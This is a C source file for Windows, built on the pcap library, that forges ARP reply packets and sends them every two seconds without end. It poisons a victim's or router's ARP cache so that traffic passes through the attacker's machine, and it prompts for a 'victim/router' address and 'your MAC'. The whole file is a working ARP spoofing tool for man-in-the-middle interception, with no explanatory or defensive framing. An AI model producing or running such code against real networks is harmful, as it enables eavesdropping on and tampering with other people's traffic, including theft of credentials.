#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <winsock2.h>
#include <stdlib.h>

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "ws2_32.lib")

void ip_to_bytes(const char *ip_str, uint8_t *bytes) {
    sscanf(ip_str, "%hhu.%hhu.%hhu.%hhu", &bytes[0], &bytes[1], &bytes[2], &bytes[3]);
}

void mac_to_bytes(const char *mac_str, uint8_t *mac) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

void send_arp_spoof(const char *iface, const char *target_ip_str, const char *target_mac_str,
                    const char *spoofed_ip_str, const char *attacker_mac_str) {
    
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    handle = pcap_open_live(iface, 65536, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live failed: %s\n", errbuf);
        return;
    }

    uint8_t packet[42];

    uint8_t target_mac[6];
    uint8_t attacker_mac[6];
    uint8_t target_ip[4];
    uint8_t spoofed_ip[4];

    mac_to_bytes(target_mac_str, target_mac);
    mac_to_bytes(attacker_mac_str, attacker_mac);
    ip_to_bytes(target_ip_str, target_ip);
    ip_to_bytes(spoofed_ip_str, spoofed_ip);

    memcpy(packet, target_mac, 6);
    memcpy(packet + 6, attacker_mac, 6);
    packet[12] = 0x08;
    packet[13] = 0x06;

    packet[14] = 0x00; packet[15] = 0x01; // Ethernet
    packet[16] = 0x08; packet[17] = 0x00; // IPv4
    packet[18] = 0x06;                    // MAC length
    packet[19] = 0x04;                    // IP length
    packet[20] = 0x00; packet[21] = 0x02; // ARP Reply

    memcpy(packet + 22, attacker_mac, 6);     // Sender MAC
    memcpy(packet + 28, spoofed_ip, 4);       // Sender IP
    memcpy(packet + 32, target_mac, 6);       // Target MAC
    memcpy(packet + 38, target_ip, 4);        // Target IP

    printf("Sending spoofed ARP reply...\n");
    pcap_sendpacket(handle, packet, 42);
    pcap_close(handle);
}

int main() {
    char iface[256], target_ip[16], target_mac[18];
    char spoofed_ip[16], attacker_mac[18];

    FILE *f = fopen("selected_interface.txt", "r");
    if (!f) {
        printf("Run interface selector first.\n");
        return 1;
    }
    fgets(iface, sizeof(iface), f);
    iface[strcspn(iface, "\n")] = '\0';
    fclose(f);

    printf("Enter target IP (victim/router): ");
    scanf("%15s", target_ip);

    printf("Enter target MAC: ");
    scanf("%17s", target_mac);

    printf("Enter spoofed IP (router or victim): ");
    scanf("%15s", spoofed_ip);

    printf("Enter your MAC: ");
    scanf("%17s", attacker_mac);

    while (1) {
        send_arp_spoof(iface, target_ip, target_mac, spoofed_ip, attacker_mac);
        Sleep(2000);
    }

    return 0;
}
